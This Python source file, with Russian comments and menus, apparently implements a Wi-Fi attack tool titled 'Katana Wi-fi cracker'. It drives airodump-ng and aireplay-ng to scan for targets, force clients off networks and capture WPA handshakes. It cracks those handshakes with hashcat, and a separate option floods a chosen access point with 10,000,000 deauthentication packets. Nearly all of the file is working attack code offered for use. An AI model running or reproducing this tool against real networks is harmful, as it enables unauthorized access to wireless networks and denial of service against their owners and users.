import os
import time
import threading
#===================================================================
#АНАЛИЗ ФАЙЛА И АККУРАТНЫЙ ВЫВОД НА ЭКРАН(ВЫЗЫВАЕТСЯ ЧЕРЕЗ start())
#===================================================================

count = 0
mass_names = [] #essid точек
mass_frequency = [] #Частоты сопоставленные с клиентами
mass_defence = [] #Протокол рукопожатия
mass_a = [] #Массив точек доступа
mass_b = [] #Массив клиентов
mass_b_2 = [] #Массив точек доступа сопоставлен с массивом клиентов
trash = [] #Повторяющиеся адреса точек доступа с клиентами(по их количеству определяется кол-во клиентов)
last_mass = [] #Финальный массив с готовым к выводом на экран статусом точек доступа и клиентов
bssid_essid = {} #bssid-essid словарь
for_crack = {} #Словарь номера в таблице - bssid
freq = [] #Словарь с частотами(работает в паре с for_crack())

def mass_a_read():
        global mass_a, mass_b, mass_b_2
        with open('networks-01.csv', 'r') as file:
            file.readline()
            for line in file:
                a = line.split()
                if len(a) != 0 and a[0] == 'Station':
                    for line_two in file:
                        b = line_two.split()
                        if len(b) != 0:
                            mass_b.append(b[0])
                            mass_b_2.append(b[7])
                else:
                    if len(a) != 0 and a[0] !='BSSID,':
                        mass_a.append(a[0])
                        mass_frequency.append(a[5])
                        mass_defence.append(a[7])
                        l = len(a)
                        mass_names.append(a[l-1])
                        bssid_essid[a[0]] = a[l-1]

def sopost():
    global trash
    global count
    for a in mass_a:
        for b in mass_b_2:
            count += 1
            if b == a:
                trash.append(a)



def show():
    for a in mass_a:
        for b in trash:
            if b == a:
                c = trash.count(b)
                bssid = ''
                essid = bssid_essid[b]
                if essid == '' or essid == ',':
                    continue
                for letter in a:
                    if letter == '' or letter == ',':
                        continue
                    else:
                        bssid += letter
                last_mass.append(f'\033[31m{essid} | число клиентов: {c}\033[0m')

def write():
    sett = set(last_mass)
    for a in sett:
        print(a)
    os.system('sudo rm -rf networks-01.csv')

def show_list():
    count = 0
    for a in mass_a:
        fr = mass_frequency[count]
        defence = mass_defence[count]
        essid = mass_names[count]

        bssid = ''
        frequency = ''
        defence_main = ''
        essid_main = ''
        if essid == '' or essid == ',':
            count += 1
            continue
        else:
            for letter in a:
                if letter == '' or letter == ',':
                    continue
                else:
                    bssid += letter
            for letter in fr:
                if letter == '' or letter == ',':
                    continue
                else:
                    frequency += letter
            for letter in defence:
                if letter == '' or letter == ',':
                    continue
                else:
                    defence_main += letter
            for letter in essid:
                if letter == '' or letter == ',':
                    continue
                else:
                    essid_main += letter
            for_crack[count] = bssid
            freq.append(frequency)
            print(f"\033[32m{count}) {bssid} | {frequency} | {defence_main} | {essid_main}\033[0m")
            count += 1
def start():
    mass_a_read()
    sopost()
    show()
    print('\033[31m===================================================\033[0m')
    print('\033[31m  BSSID               Ch  Privacy  ESSID         ||\033[0m')
    print('\033[31m===================================================\033[0m')
    show_list()
    print('')
    print('\033[31m===================================================\033[0m')
    print('\033[31m         ТОЧКА ДОСТУПА -> ЧИСЛО КЛИЕНТОВ         ||\033[0m')
    print('\033[31m===================================================\033[0m')
    write()

#==================================================================, 
#              ГЛАВНОЕ МЕНЮ ПРОГРАММЫ И ЕЕ ВЫБОРНЫЕ ПАНЕЛИ        
#==================================================================


def start_window():
    global whereiam, adapter_mode 
    adapter_mode = 'Managed'
    whereiam = os.getcwd()
    os.system('clear')
    print(f'''\033[31m
+===============================================================+=========================================================================
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣙⣿⡉⢷⣄⠀⠀⠀⠀⣸⣽⣇⠀⠀⠀⠀⣠⣾⢍⣽⣋⣃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  | ⠀ /$$   /$$             /$$                ⠀⠀⠀⠀⠀⠀
|     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠿⠿⢮⣳⢝⡻⡌⢿⣇⠀⢀⡼⢿⣼⣿⢧⣀⠀⣰⡿⢁⣿⣫⣗⡦⠿⠷⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  |⠀⠀| $$  /$$/            | $$              
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⡾⠾⣿⣾⣉⠀⣄⣸⣿⣿⣮⣷⣿⠳⢶⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    |  | $$ /$$/   /$$$$$$  /$$$$$$    /$$$$$$  /$$$$$$$   /$$$$$$                                   
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⣯⡿⠟⢾⣯⢿⣽⢿⠛⢿⣽⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     |  | $$$$$/   |____  $$|_  $$_/   |____  $$| $$__  $$ |____  $$
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣷⠶⣦⣄⡞⠁⣸⠋⢳⣿⣿⣿⣿⣽⡾⣿⣿⣿⣳⣤⣴⣶⣶⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    |  | $$  $$    /$$$$$$$  | $$      /$$$$$$$| $$  \\ $$  /$$$$$$$⠀⠀⠀⠀⠀⠀⠀⠀
|       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡧⣿⣿⣿⣿⣿⣁⣤⣿⣶⣿⣾⡟⠛⠻⣷⣿⣿⡿⣜⣟⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   |  | $$\\  $$  /$$__  $$  | $$ /$$ /$$__  $$| $$  | $$ /$$__  $$
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⢷⣿⣿⣿⣾⣿⢫⣵⠏⠀⠀⠀⠙⣦⡙⢿⣿⣿⣿⣿⡿⠟⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   |  | $$ \\  $$|  $$$$$$$  |  $$$$/|  $$$$$$$| $$  | $$|  $$$$$$$⠀⠀
| ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣛⡿⠯⣤⣤⣤⣤⣤⣼⣷⣿⣿⣿⣿⣿⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  |⠀⠀|__/  \\__/ \\_______/   \\___/   \\_______/|__/  |__/ \\_______/⠀⠀
| ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|                                                          
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣾⣿⣿⣼⡇⠙⣛⣿⣿⣹⣡⣍⢻⡿⠟⠋⢹⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|    __        ___        __ _                       _             
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡀⠤⠒⣿⠯⠹⠿⢿⠒⠤⢀⣾⣿⣿⣿⣟⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|    \\ \\      / (_)      / _(_)   ___ _ __ __ _  ___| | _____ _ __ 
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⣿⣿⣿⣿⣿⣧⡝⠀⡀⠛⠲⠤⠶⠟⣀⡀⢸⣿⣿⣿⣿⣿⣿⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|     \\ \\ /\\ / /| |_____| |_| |  / __| '__/ _` |/ __| |/ / _ \\ '__| 
|⣀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣿⣿⣿⣿⣿⣿⣿⡀⢿⣿⣿⣿⣿⣿⡿⢰⣿⣿⣿⣿⣿⣿⣿⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀|      \\ V  V / | |_____|  _| | | (__| | | (_| | (__|   <  __/ |   
|⣿⣿⣿⢿⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠓⠚⠻⠿⠿⢿⣿⡖⠯⢿⣿⣿⠿⢣⣿⡿⠿⠿⠿⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣿⣿⣿⣿⣶⣤|       \\_/\\_/  |_|     |_| |_|  \\___|_|  \\__,_|\\___|_|\\_\\___|_|   
|⠛⠛⠛⠾⠧⣽⣋⡟⢻⠿⣶⣶⣤⣄⣀⣴⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠶⢤⣤⡤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣄⣠⣴⣶⣾⠿⡟⣻⣛⣿⠼⠷⠛⠛⠛⠁⠈|        
|⠀⠀⠀⠀⠀⠀⠈⠉⠛⠒⠧⢼⣃⣛⣿⡿⠛⢻⠦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠴⡞⠻⢿⣿⢛⣩⡧⠼⠒⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀|                                    hacking like science 2013's
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡷⠦⠾⢍⣑⡺⠯⢝⣷⡶⢤⣄⣀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣾⡯⠿⢗⣛⡩⠿⠴⢾⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ |                             ⠀      
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠒⠲⢬⣍⣓⡛⠯⢿⣶⡾⠿⣿⣒⣩⡥⠔⠒⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|                               https://github.com/Cyberuser-hash
|            ⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠶⠒⠛⠉⠉⢉⣳⡶⠦⢭⣀⣀⠉⠉⠓⠒⠶⠤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ⠀⠀⠀⠀⠀⠀ |
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⡴⠶⠛⠋⠉⠁⢀⣀⣠⠴⠖⠚⠉⠁⠀⠀⠀⠀⠀⠈⠉⠛⠲⠦⢤⣀⡀⠈⠉⠙⠓⠶⠦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ |
|⠀⠀⠀⠀⠀⠀⠀⣰⠞⠛⠋⠉⠁⢀⣠⡤⠴⠒⠚⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠢⢤⣤⣀⠀⠉⠙⠳⣦⠀⠀⠀⠀⠀⠀⠀⠀ ⠀|
|⠀⠀⠀⠀⠀⢀⣼⡧⠤⠔⠒⠊⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠲⠤⢼⣧⡀⠀⠀⠀⠀⠀  |                                                            
|                                                               | Version: 1.1                                                                       
+===============================================================+==========================================================================
[                      \033[32m ОСНОВНОЕ МЕНЮ\033[0m \033[31m                          ]=>{whereiam}
+===============================================================+\033[0m''')


def start_windowa():
    print(f'''\033[31m
+===============================================================+=========================================================================
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣙⣿⡉⢷⣄⠀⠀⠀⠀⣸⣽⣇⠀⠀⠀⠀⣠⣾⢍⣽⣋⣃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  | ⠀ /$$   /$$             /$$                ⠀⠀⠀⠀⠀⠀
|     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠿⠿⢮⣳⢝⡻⡌⢿⣇⠀⢀⡼⢿⣼⣿⢧⣀⠀⣰⡿⢁⣿⣫⣗⡦⠿⠷⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  |⠀⠀| $$  /$$/            | $$
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⡾⠾⣿⣾⣉⠀⣄⣸⣿⣿⣮⣷⣿⠳⢶⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    |  | $$ /$$/   /$$$$$$  /$$$$$$    /$$$$$$  /$$$$$$$   /$$$$$$
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⣯⡿⠟⢾⣯⢿⣽⢿⠛⢿⣽⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     |  | $$$$$/   |____  $$|_  $$_/   |____  $$| $$__  $$ |____  $$
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣷⠶⣦⣄⡞⠁⣸⠋⢳⣿⣿⣿⣿⣽⡾⣿⣿⣿⣳⣤⣴⣶⣶⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    |  | $$  $$    /$$$$$$$  | $$      /$$$$$$$| $$  \\ $$  /$$$$$$$⠀⠀⠀⠀⠀⠀⠀⠀
|       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡧⣿⣿⣿⣿⣿⣁⣤⣿⣶⣿⣾⡟⠛⠻⣷⣿⣿⡿⣜⣟⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   |  | $$\\  $$  /$$__  $$  | $$ /$$ /$$__  $$| $$  | $$ /$$__  $$
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⢷⣿⣿⣿⣾⣿⢫⣵⠏⠀⠀⠀⠙⣦⡙⢿⣿⣿⣿⣿⡿⠟⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   |  | $$ \\  $$|  $$$$$$$  |  $$$$/|  $$$$$$$| $$  | $$|  $$$$$$$⠀⠀
| ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣛⡿⠯⣤⣤⣤⣤⣤⣼⣷⣿⣿⣿⣿⣿⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  |⠀⠀|__/  \\__/ \\_______/   \\___/   \\_______/|__/  |__/ \\_______/⠀⠀
| ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣾⣿⣿⣼⡇⠙⣛⣿⣿⣹⣡⣍⢻⡿⠟⠋⢹⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|    __        ___        __ _                       _
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡀⠤⠒⣿⠯⠹⠿⢿⠒⠤⢀⣾⣿⣿⣿⣟⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|    \\ \\      / (_)      / _(_)   ___ _ __ __ _  ___| | _____ _ __
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⣿⣿⣿⣿⣿⣧⡝⠀⡀⠛⠲⠤⠶⠟⣀⡀⢸⣿⣿⣿⣿⣿⣿⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|     \\ \\ /\\ / /| |_____| |_| |  / __| '__/ _` |/ __| |/ / _ \\ '__|
|⣀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⣿⣿⣿⣿⣿⣿⣿⡀⢿⣿⣿⣿⣿⣿⡿⢰⣿⣿⣿⣿⣿⣿⣿⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀|      \\ V  V / | |_____|  _| | | (__| | | (_| | (__|   <  __/ |
|⣿⣿⣿⢿⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠓⠚⠻⠿⠿⢿⣿⡖⠯⢿⣿⣿⠿⢣⣿⡿⠿⠿⠿⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣿⣿⣿⣿⣶⣤|       \\_/\\_/  |_|     |_| |_|  \\___|_|  \\__,_|\\___|_|\\_\\___|_|
|⠛⠛⠛⠾⠧⣽⣋⡟⢻⠿⣶⣶⣤⣄⣀⣴⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠶⢤⣤⡤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣄⣠⣴⣶⣾⠿⡟⣻⣛⣿⠼⠷⠛⠛⠛⠁⠈|
|    ⠀⠀⠈⠉⠛⠒⠧⢼⣃⣛⣿⡿⠛⢻⠦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠴⡞⠻⢿⣿⢛⣩⡧⠼⠒⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀|                                    hacking like science 2013's
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡷⠦⠾⢍⣑⡺⠯⢝⣷⡶⢤⣄⣀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣾⡯⠿⢗⣛⡩⠿⠴⢾⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ |                             ⠀
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠒⠲⢬⣍⣓⡛⠯⢿⣶⡾⠿⣿⣒⣩⡥⠔⠒⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|                               https://github.com/Cyberuser-hash
|            ⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠶⠒⠛⠉⠉⢉⣳⡶⠦⢭⣀⣀⠉⠉⠓⠒⠶⠤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ |
|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⡴⠶⠛⠋⠉⠁⢀⣀⣠⠴⠖⠚⠉⠁⠀⠀⠀⠀⠀⠈⠉⠛⠲⠦⢤⣀⡀⠈⠉⠙⠓⠶⠦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ |
|⠀⠀⠀⠀⠀⠀⠀⣰⠞⠛⠋⠉⠁⢀⣠⡤⠴⠒⠚⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠢⢤⣤⣀⠀⠉⠙⠛⠳⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀|
|⠀⠀⠀⠀⠀⢀⣼⡧⠤⠔⠒⠊⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠒⠲⠤⢼⣧⡀⠀⠀⠀⠀⠀  |
|                                                               | Version: 1.1                                                                     
+===============================================================+==========================================================================
[                      \033[32m ОСНОВНОЕ МЕНЮ\033[0m \033[31m                          ]=>{whereiam} | Adapter: {adapter_name} | mode: {adapter_mode}
+===============================================================+\033[0m''')


def choice_base():
    print('''\033[32m+ 1) Сканирование сети
+ 2) Перевод адаптера в режим мониторинга
+ 3) Брутфорс wpa/wpa2 handshake
+ 4) Выбор адаптера для работы
+ 5) DDoS(Deauth атака)  
          \033[0m''')

def choice_cycle():
    while True:
        os.system('clear')
        if adapter_name == '':
            start_window()
            choice_base()
        else:
            start_windowa()
            choice_base()
        try:
            choice = int(input("\033[36mВаш выбор: \033[0m"))
            if choice == 4:
                choice_adapter()
                os.system('clear')
            if choice == 1 and adapter_name == '':
                print("\033[33m[i] Выберите и переведите адаптер в режим мониторинга\033[0m")
                choice_adapter()
                os.system('clear')
            elif choice == 1 and adapter_name != '':
                print('\033[33m[i] Закройте окно через 20 секунд\033[0m')
                scanner()
                os.system('clear')
                start()
                print()
                print('\033[33mУкажите номер цели: \033[0m', end='')
                try:
                    victim = int(input())
                    filen = input('\033[33mВведите название файла с хэндшейком: \033[0m')
                    deauth = False
                    packages = 20
                    while True:
                        check_status = input('\033[33mХотите провести деаутентификацию?(По умолчанию N)y\\n?\033[0m')
                        if check_status == 'y' or check_status == 'Y':
                            deauth = True
                            try:
                                sec_1 = input('\033[33mУкажите количество пакетов(По умолчанию 20)')
                                if sec_1 == '':
                                    break
                                else:
                                    sec = sec_1
                                    break
                            except(ValueError):
                                print("\033[33m[i] Введите число\033[0m")
                                time.sleep(1)
                                os.system('clear')
                        else:
                            deauth = False
                            break
                    listen(victim, filen, deauth, packages)


                except(ValueError):
                    print("\033[33m[i] Введите число\033[0m")
                    time.sleep(1)
                    os.system('clear')

            if choice == 2 and adapter_name != '':
                airmonng()
                os.system('clear')
            elif choice == 2 and adapter_name == '':
                print('\033[33m[i] Сначала выберите адаптер\033[0m')
                choice_adapter()
                airmonng()
                print('\033[33mАдаптер успешно переведен в moditor mode!\033[0m')
                print('\033[33mНажмите для продолжения...\033[0m', end='')
                trash_variable = input('')
                os.system('clear')
            if choice == 3:
                bruteforce()
            if choice == 5 and adapter_name == '':
                print('\033[33m[i] Выберите и переведите адаптер в режим мониторинга\033[0m')
                choice_adapter()
                os.system('clear')
            elif choice == 5 and adapter_name != '':
                deauth_attack()
        except(ValueError):
            os.system('clear')


#================================================================
#                   1) Сканирование сети и кража хэндшейка
#================================================================
def scanner():
    os.system(f'sudo xterm -e "airodump-ng -w networks --output-format csv -o {adapter_name}"')

def deauth(bssid, packages):
    os.system(f'xterm -e "sudo aireplay-ng -0 {packages} -a {bssid} {adapter_name}"')

def listen(key, filename, status, packages):
    frequencee = freq[key]
    if status == True:
        for_crack_key = for_crack[key]
        threading.Thread(target=deauth, args=(for_crack_key, packages)).start()
    os.system(f'xterm -e "sudo airodump-ng --bssid {for_crack[key]} -c {frequencee} -w {filename} --output-format pcap {adapter_name}"')


#================================================================
#                   2) Мониторинг мод
#================================================================

def airmonng():
    global adapter_mode
    os.system(f'xterm -e "sudo ip link set {adapter_name} up"')
    os.system('xterm -e "sudo systemctl stop NetworkManager"')
    os.system('xterm -e "sudo pkill -9 wpa_supplicant NetworkManager"')
    os.system(f'xterm -e "sudo airmon-ng start {adapter_name}"')
    adapter_mode = "Monitor"
#================================================================
#                   3) Брутфорс
#================================================================

def bruteforce():
    while True:
        os.system('clear')
        start_windowa()
        print('''\033[32m+ 1)Hashcat \033[0m''')
        try:
            choice = int(input("\033[36mВаш выбор: \033[0m"))
        except ValueError:
            print("\033[33m[i] Введите число\033[0m")
            time.sleep(1)
            continue
        if choice == 1:
            file_path = input(f"\033[33mУкажите название файла с хэндшейком(.pcapng, .pcap) или путь до него(/home/user/handshake.pcap): \033[0m")
            file_name_mass = []
            for i in file_path[::-1]:
                if i != '/':
                   file_name_mass.append(i)
                if i == '/':
                  break
            file_name_str = ''   #Готовое имя файла с хэндшейком
            for i in file_name_mass:
                file_name_str += i
            file_name_str_rev = file_name_str[::-1]
            try:
                with open (file_path, "r") as file:
                    pass
                command = f"hcxpcapngtool -o handshake/hc22000/{file_name_str_rev}.hc22000 {file_path}"
                os.system(f'sudo xterm -e "{command}"')
                print('\033[33m[i] Файл переведен в формат понятный hashcat\033[0m')
                dictionary = input('\033[33mУкажите путь до словаря: \033[0m')
                readyorno = input('\033[33mНачать брутфорс? Y\\N: \033[0m')
                if readyorno == 'y' or readyorno == 'Y':
                    os.system(f'sudo hashcat -m 22000 handshake/hc22000/{file_name_str_rev}.hc22000 {dictionary} -o cracked/{file_name_str}')
                    print(f"\033[33mУспешно завершено!\nНайденные файлы были сохранены в cracked/{file_name_str}\nНажмите для продолжения...\033[0m")
                    return
                else:
                    return
            except Exception as e:
                print("\033[31m[i] Ошибка открытия файла\033[0m")
                trash_variable = input('\033[33mНажмите для продолжения...\033[0m')
#================================================================
#                   4) Выбор адаптера для работы
#================================================================
adapter_name = ''
def choice_adapter():
    global adapter_name
    print('\033[33mВведите имя вашего wifi-адаптера из команды ip address: \033[0m', end='')
    adapter_name = input()

#================================================================
#                   5) Deauth атака
#================================================================
def deauth_attack():
    scanner()
    os.system('clear')
    start()
    try:
        victim = int(input('\033[33mУкажите номер цели: \033[0m'))
        frequence_ap = freq[victim]
        os.system(f'xterm -e "sudo iw dev {adapter_name} set channel {frequence_ap}"')
        os.system(f'xterm -e "sudo aireplay-ng --deauth 10000000 -a {for_crack[victim]} {adapter_name}"')
        os.system('clear')
    except(ValueError):
        print('\033[33m[i] Введите число\033[0m')
        time.sleep(1)
        os.system('clear')
os.system('clear')
choice_cycle()
